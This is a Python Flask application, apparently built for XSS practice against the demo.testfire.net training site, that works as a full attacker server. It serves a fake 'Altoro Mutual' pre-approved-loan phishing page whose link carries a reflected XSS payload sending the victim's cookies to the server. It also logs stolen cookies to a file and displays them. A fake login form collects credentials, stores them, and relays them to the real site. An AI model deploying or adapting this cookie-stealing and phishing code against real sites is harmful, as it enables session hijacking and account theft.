import os
import sys
from flask import Flask, request, redirect
from time import gmtime, strftime
import requests

app=Flask(__name__)

@app.route('/')
def hello():
    return 'I created this site for testing XSS exercises'


@app.route('/heartbeat')
def heartbeat():
    return "I am alive"

@app.route('/expose')
def expose():
    datafile = "/tmp/cookiedata.txt"
    if not os.path.isfile( datafile ):
        return "server contains no data :-("
    with open(datafile) as f:
        lines = f.readlines()
    data = '<html><BODY>'
    for line in lines:
        data = data + line + '</br>'
    data = data + '</BODY></html>'
    return data


@app.route('/ilikecookies')
def ilikecookies():
    data = request.query_string.decode('unicode-escape') + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
    file = open("/tmp/cookiedata.txt","a")
    file.write(data)
    file.close()
    return data


@app.route('/whoami')
def whoami():
    return request.url_root


@app.route('/loanapproval')
def loanapproval():
    crosssite='''<!DOCTYPE html>
 <html> 
     <head> 
         <style> body { background-color:whitesmoke; } </style> 
         <title>Altoro Mutual</title> 
    </head> 
        <body> 
      
        <center> 
            <img src="./images/logo.gif" width="283" height="80/">
            <h1>You are granted loan by Altoro mutual</h1> 
            <p> 
                Your account has been granted an pre approved loan.
                To continue further, please<a href="http://demo.testfire.net/search.jsp?query=%3Cscript%3Evar+xsession%3D%22''' + request.url_root + '''ilikecookies%3F%22.concat%28document.cookie%29%3B+var+xhttp+%3D+new+XMLHttpRequest%28%29%3B+xhttp.open%28%22GET%22%2C+xsession%2C+true%29%3B+xhttp.send%28%29%3C%2Fscript%3E">click here.</a>
            </p> 
        </center> 
    </body> 
</html>
'''
    return crosssite

@app.route('/login')
def login():
    form_data='''<form id="foo" method="post" action="/handle_data">
    Username : <input type="text" name='uid' value="admin">
    Password : <input type="password" name='passw' value="">
    <input type="submit" name="submit" value="Submit">
    </form>
    '''
    return form_data


    

@app.route('/handle_data', methods=['POST'])
def handle_data():
    if request.method == 'POST':
        req = request.form
        uid = req.get('uid')
        passw = req.get('passw')
        data = 'uid: '+uid+' password: ' + ' ' + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + '\n'
        file = open("/tmp/cookiedata.txt","a")
        file.write(data)
        file.close()
        data={"uid":uid,"passw":passw,"btnSubmit":"Login"}
        
        requests.post('http://demo.testfire.net/doLogin',data)
     
    return redirect('http://demo.testfire.net')


if __name__=="__main__":
    app.run()





